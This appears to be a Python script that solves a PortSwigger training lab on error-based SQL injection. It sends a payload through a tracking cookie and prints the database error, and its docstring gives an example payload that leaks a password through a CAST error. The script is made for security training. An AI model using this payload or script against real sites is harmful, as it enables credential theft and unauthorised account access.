"""
This script is designed to demonstrate and solve the SQL injection vulnerability in the PortSwigger lab 'Visible error-based SQL injection.

Description:
"This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account."

Developed by RedTeamer IT Security
www.redteamer.de

Example Usage:
python3 script.py --url https://[DOMAIN].web-security-academy.net/ --cookie "TrackingId=" --payload "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
"""

import argparse
import requests
from bs4 import BeautifulSoup
import colorama
import urllib.parse

# Parse arguments
parser = argparse.ArgumentParser(description="SQL Injection Test Script")
parser.add_argument("--url", required=True, help="Target URL")
parser.add_argument("--cookie", required=True, help="Cookie in the format 'name=value'")
parser.add_argument("--payload", required=True, help="SQL Injection Payload")
args = parser.parse_args()

# Split the given cookie into name and value
cookie_parts = args.cookie.split('=')
if len(cookie_parts) != 2:
    print("Invalid cookie format. Use the format 'name=value'.")
else:
    cookie_name = cookie_parts[0]
    cookie_value = args.payload

    # Prepare the GET request
    url = args.url
    cookies = {cookie_name: cookie_value}
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}

    # Send the GET request
    response = requests.get(url, cookies=cookies, headers=headers)

    # Parse HTML text
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find the <p class="is-warning"> element and display the text in red color
    warning_element = soup.find('p', class_='is-warning')
    if warning_element:
        print(colorama.Fore.RED + warning_element.text)
    else:
        print(colorama.Fore.GREEN + "[+] Query ok!")

    # Reset color
    print(colorama.Style.RESET_ALL)

